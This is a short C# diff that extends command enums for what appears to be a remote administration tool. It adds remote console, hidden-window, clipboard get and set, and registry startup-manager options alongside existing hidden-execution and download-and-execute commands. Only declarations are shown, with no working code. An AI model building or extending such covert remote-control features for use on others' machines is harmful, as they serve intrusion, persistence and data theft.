@@ -10,19 +10,50 @@
         Execute,
         ExecuteHidden,
         Close,
+        Restart,
         DeleteFile,
         DownloadAndExecute,
         DownloadFile,
         KillProcess,
         SuspendProcess,
-        ResumeProcess
+        ResumeProcess,
+        Console,
+        HideWindow,
+        Clipboard,
+        StartupManager
     }
 
+    public enum StartupManagerCommand : byte
+    {
+        GetStartupItems,
+        StartupItems
+    }
+
+    public enum StartupType : byte
+    {
+        HKCU,
+        HKCUO,
+        HKLM,
+        HKLMO
+    }
+
+    public enum ConsoleCommand : byte
+    {
+        SendCommand,
+        Responce
+    }
+    public enum ClipboardCommand : byte
+    {
+        SetText,
+        GetText,
+        Text
+    }
     public enum FileManagerCommand : byte
     {
         DriveResponce,
         DirectoryResponce,
         Update,
+        UpdateToSpecialFolder,
         Invalid,
         StartDownload,
         DownloadInvalid,
